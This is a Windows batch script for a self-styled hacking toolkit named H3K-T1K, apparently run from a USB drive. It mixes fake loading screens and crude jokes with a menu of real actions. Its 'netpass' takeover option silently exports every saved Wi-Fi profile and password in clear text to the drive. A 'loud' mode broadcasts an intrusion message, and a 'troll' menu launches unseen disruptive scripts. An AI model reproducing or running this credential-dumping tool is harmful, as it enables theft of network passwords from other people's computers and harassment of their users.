                @Echo Off
rem CenterSelf
Echo.
:boot
color 0a
echo Gathering Shit Together..
Echo.
rem wait 100
rem CenterSelf
set FGcol=10
rem ChangeColor %FGcol% 0
rem PrintBoxAt 12 31 3 20 2
rem ChangeColor 0 %FGcol%

rem Wait 30
REM COPY FILES HERE

rem ShadeBoxAt 13 32 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 34 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 36 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 38 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 40 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 42 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 44 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 46 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 48 1 2 2

rem ClearColor
rem Locate 25 1

rem wait 100


Cls 
color 0a
Echo.
echo Searching For Fucks To Give..
Echo.
rem wait 100
rem CenterSelf
set FGcol=10
rem ChangeColor %FGcol% 0
rem PrintBoxAt 12 31 3 20 2
rem ChangeColor 0 %FGcol%

rem Wait 30
REM COPY FILES HERE

rem ShadeBoxAt 13 32 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 34 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 36 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 38 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 40 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 42 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 44 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 46 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 48 1 2 2

rem ClearColor
rem Locate 25 1

rem wait 500                


Cls 
color 0a
Echo.
echo Initializing H3K-T1K Background Proccesses..
Echo.
rem wait 100
rem CenterSelf
set FGcol=10
rem ChangeColor %FGcol% 0
rem PrintBoxAt 12 31 3 20 2
rem ChangeColor 0 %FGcol%

rem Wait 30
REM COPY FILES HERE

rem ShadeBoxAt 13 32 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 34 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 36 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 38 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 40 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 42 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 44 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 46 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 48 1 2 2

rem ClearColor
rem Locate 25 1

rem wait 100
cls

title H3K-T1K          
                                                                                                                                                                                                                                    
:start
rem wait 100                
Cls 
color 0B                                                               
Echo.
echo           /------------------------/
echo          /                        /
echo         /     H3K-T1K   V2.0     /
echo        /                        /
echo       /------------------------/
Echo.
echo.
echo Type help for a list of available commands.
Echo.
set /p question1="/H3K-T1K/CommandLine~"

if %question1%==help (goto help)
if %question1%==shutdown (goto shutdown)
if %question1%==takeover (goto takeover)
if %question1%==ip (goto ip)
if %question1%==ping (goto ping)
if %question1%==troll (goto troll)
if %question1%==password (goto password)
if %question1%==webip (goto webip)
if %question1%==vpn (goto vpn)
if %question1%==darknet (goto darknet)              
:error
Cls 
echo ERROR, INVALID ENTRY
Pause
goto start 

:help
Cls 
start readme.txt
cls
goto start

:shutdown
cls
arp -a
net view
shutdown -i
Pause
goto start 

:vpn
Cls 
rem wait 20
cd Ext/VPN                                
Echo.
echo starting up vpn
start ProtonVPN.Launcher.exe
Pause
cd ..
cd ..
goto start

:darknet
cls
Echo.
echo Are you sure you want to proceed?
set /p question6="Y/N~"
if %question6%==y (goto yes) 
if %question6%==n (goto start) 
goto error              

:yes
Cls 
cd Ext/TorBrowser/Browser
rem wait 50
start firefox.exe
rem wait 100
cd ..
rem wait 20
cd ..
rem wait 50  
cd VPN
rem wait 20             
start ProtonVPN.Launcher.exe
Pause
cd ..
cd ..
goto start
                



:password
start password.exe
Pause
goto start

:webip
cls
Echo.
echo Entering sysnet node protocol
rem wait 300
rem CenterSelf
set FGcol=10
rem ChangeColor %FGcol% 0
rem PrintBoxAt 12 31 3 20 2
rem ChangeColor 0 %FGcol%

rem Wait 30
REM COPY FILES HERE

rem ShadeBoxAt 13 32 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 34 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 36 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 38 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 40 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 42 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 44 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 46 1 2 2

rem Wait 30
REM COPY MORE FILES HERE

rem ShadeBoxAt 13 48 1 2 2

rem ClearColor
rem Locate 25 1

rem wait 100
cls

color 0a
nslookup
pause
goto start


:ip
Cls 
Echo.
echo Fetching public IP Information
echo.
rem wait 800
curl checkip.amazonaws.com
ipconfig /all > IPoutput.txt
Echo.
echo Continue back to H3K-T1K?
Pause 
goto start

:troll
echo. 
echo Welcome to the troll menu
echo What would you like to do?
echo.
set /p question4="/H3K-T1K/CommandLine/Troll~"
if %question4%==foolish (start Ext/foolishness.vbs)
if %question4%==all (goto trollall)
if %question4%==breaker (start Ext/breaker.bat)
if %question4%==options1 (start Ext/options1.vbs)
if %question4%==options2 (start Ext/options2.bat)
if %question4%==filler (start Ext/filler.bat)
goto error 

:trollall
start Ext/foolishness.vbs
start Ext/breaker.bat
start Ext/options.vbs
start Ext/filler.bat
goto error

:ping
Cls 
Echo.
Echo Welcome To The Ping Menu
Echo Please enter the address you'd like to ping.
Echo.
set /p question3="/H3K-T1K/CommandLine/Ping~"               
ping %question3%
Pause
goto start

:takeover
cls
Echo.
echo You are about to take over the network
echo Which mode should takeover execute in?
Echo.
echo Silent keeps your actions discreet!
echo. 
echo Enter Silent/Loud
echo.
set /p question2="/H3K-T1K/TakeOver~"
if %question2%==silent (goto takeoverS)
if %question2%==loud (goto takeoverL)
goto error

:takeoverS
cls
Echo.               
echo You are in TakeOver mode 
color 0a
echo. 
set /p question2="/H3K-T1K/TakeOver-S~"
if %question2%==netpass (goto netpass)
if %question2%==shark (start F:\H3K-T1K\Ext\shark\WiresharkPortable64.exe)
goto error

:takeoverL
cls
msg * This network has been injected by H3K-T1K
Echo.
echo You are in TakeOver mode
color 0a 
echo. 
set /p question2="/H3K-T1K/TakeOver-L~"
if %question2%==netpass (goto netpass)
if %question2%==shark (start F:\H3K-T1K\Ext\shark\WiresharkPortable64.exe)
goto error

:netpass
cls             
Echo.
echo Copying wifi profiles + keys to Drive
Echo.
rem wait 300
MD "%~dp0%COMPUTERNAME%" 
netsh wlan export profile folder="%~dp0%COMPUTERNAME%" key=clear
dir "%~dp0%computername%" /B >> "%~dp0%computername%"\Wireless.txt
rem wait 200
Echo.
echo Success! Going back to TakeOver.
Pause
goto takeoverS








               